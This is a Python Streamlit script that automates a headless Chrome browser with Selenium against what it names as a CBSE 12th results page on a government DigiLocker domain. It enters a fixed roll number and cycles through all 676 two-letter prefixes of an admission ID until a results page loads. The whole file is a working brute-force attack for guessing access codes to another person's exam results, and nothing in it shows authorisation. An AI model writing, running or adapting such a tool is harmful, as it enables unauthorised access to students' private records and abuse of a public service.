import streamlit as st
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
import string

URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    return webdriver.Chrome(options=options)

def is_success(driver):
    debug_info = {"error_text": "", "has_result_keywords": False, "page_length": 0}
    
    try:
        # Check error message
        try:
            error_elem = driver.find_element(By.ID, "err_msg")
            if error_elem.is_displayed():
                debug_info["error_text"] = error_elem.text.strip()
                if debug_info["error_text"]:
                    return False, debug_info
        except NoSuchElementException:
            debug_info["error_text"] = "No err_msg element"
        except:
            debug_info["error_text"] = "Error finding err_msg"

        # Success checks
        page_text = driver.page_source.lower()
        debug_info["page_length"] = len(driver.page_source)
        
        success_indicators = ["marks", "result", "subject", "grade", "total", "percentage"]
        debug_info["has_result_keywords"] = any(ind in page_text for ind in success_indicators)

        if debug_info["has_result_keywords"]:
            return True, debug_info

        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
            return True, debug_info

    except Exception as e:
        debug_info["error_text"] = f"Exception: {str(e)}"
    
    return False, debug_info


# ====================== UI ======================
st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
st.title("🔍 CBSE 12th Result Brute Forcer - Debug Mode")

roll_number = st.text_input("Roll Number", value="18615900")
known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
delay = st.slider("Delay between attempts (seconds)", 2.0, 5.0, 2.8, 0.1)

if st.button("🚀 Start Brute Force", type="primary"):
    if len(known_last_6) != 6:
        st.error("Last 6 characters must be exactly 6.")
    else:
        status = st.empty()
        progress = st.empty()
        result_box = st.empty()
        debug_expander = st.expander("🔍 Debug Log (Click to expand)", expanded=True)

        driver = None
        try:
            driver = get_driver()
            driver.get(URL)
            status.success("✅ Page loaded. Starting brute force...")

            letters = string.ascii_uppercase
            count = 0

            for first in letters:
                for second in letters:
                    code = f"{first}{second}{known_last_6}"
                    attempt = f"{first}{second}"
                    count += 1

                    progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")

                    try:
                        driver.find_element(By.ID, "rroll").clear()
                        driver.find_element(By.ID, "rroll").send_keys(roll_number)

                        driver.find_element(By.ID, "admn_id").clear()
                        driver.find_element(By.ID, "admn_id").send_keys(code)

                        driver.find_element(By.ID, "submit").click()
                        time.sleep(delay)

                        success, debug_info = is_success(driver)

                        # Log for debugging
                        log_msg = f"{attempt} | Success: {success} | Error: {debug_info['error_text'][:80]} | Keywords: {debug_info['has_result_keywords']} | Length: {debug_info['page_length']}"
                        debug_expander.write(log_msg)

                        if success:
                            result_box.success(f"""
                            🎉 SUCCESS FOUND!

                            Full Code: **{code}**
                            Prefix: **{attempt}**
                            """)
                            st.balloons()
                            break
                    except Exception as e:
                        debug_expander.write(f"{attempt} → Exception: {str(e)}")
                        continue

            else:
                st.error("❌ Finished all 676 attempts without success.")

        except Exception as e:
            st.error(f"Critical Error: {str(e)}")
        finally:
            if driver:
                driver.quit()
